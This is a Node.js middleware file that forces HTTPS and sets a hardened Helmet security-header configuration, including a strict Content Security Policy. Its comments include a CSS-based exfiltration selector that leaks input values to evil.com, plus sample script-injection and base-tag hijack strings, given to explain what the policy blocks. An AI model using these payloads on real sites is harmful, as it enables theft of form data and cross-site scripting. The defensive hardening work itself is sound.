const helmet = require('helmet');

// Middleware to enforce HTTPS redirection
const httpsRedirect = (req, res, next) => {
  if (process.env.NODE_ENV === 'production' && req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, `https://${req.hostname}${req.originalUrl}`);
  }
  next();
};

// Helmet configuration
const helmetConfig = helmet({
  // Enforce HTTPS via HSTS
  hsts: {
    maxAge: 31536000, // 1 year in seconds
    includeSubDomains: true,
    preload: true
  },
  // Prevent clickjacking via X-Frame-Options
  frameguard: {
    action: 'deny'
  },
  // Content Security Policy — hardened (Phase 8 pen test fix)
  //
  // VULNERABLE config (do NOT use):
  //   styleSrc: ["'self'", "'unsafe-inline'"]
  //   ↑ allows <style> injection and style= attributes; attacker can exfiltrate data via CSS
  //   e.g.  input[value^="a"] { background: url(https://evil.com/?c=a) }
  //
  // HOW THE HARDENED CSP BLOCKS XSS:
  //   An injected <script>alert(1)</script> is blocked because scriptSrc is 'self' only.
  //   A data: URI script is blocked because it is not listed.
  //   Inline event handlers (onclick=...) are blocked — no 'unsafe-inline' anywhere.
  //   base-uri 'self' prevents <base href="https://evil.com"> hijacking relative URLs.
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],           // no unsafe-inline, no unsafe-eval
      styleSrc: ["'self'"],            // no unsafe-inline
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", "https:", "data:"],
      objectSrc: ["'none'"],           // block Flash and plugins entirely
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      baseUri: ["'self'"],             // SECURITY: prevents <base> tag hijacking
    },
  },
});

module.exports = {
  httpsRedirect,
  helmetConfig
};
